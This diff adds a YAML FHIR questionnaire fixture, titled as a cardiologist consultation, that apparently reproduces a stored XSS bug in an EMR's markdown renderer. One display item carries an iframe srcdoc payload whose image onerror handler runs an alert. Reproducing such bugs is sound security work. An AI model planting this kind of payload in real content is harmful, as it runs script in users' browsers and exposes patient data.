@@ -1,0 +1,25 @@
+id: xss-markdown
+name: xss-markdown
+title: Cardiologist consultation
+resourceType: Questionnaire
+status: active
+description: >-
+  Security reproduction for CVE-2026-PENDING - stored XSS via unsanitized markdown
+  rendering. The `xss-banner` display item carries a raw-HTML payload that executes
+  when MarkdownRender renders it (rehype-raw with no rehype-sanitize).
+meta:
+  profile:
+    - https://emr-core.beda.software/StructureDefinition/fhir-emr-questionnaire
+item:
+  - linkId: xss-banner
+    type: display
+    itemControl:
+      coding:
+        - code: markdown
+    text: "<iframe srcdoc=\"<img src=x onerror=alert('hacked')>\"></iframe>"
+  - linkId: complaints
+    type: string
+    text: Complaints
+  - linkId: assessment
+    type: text
+    text: Assessment
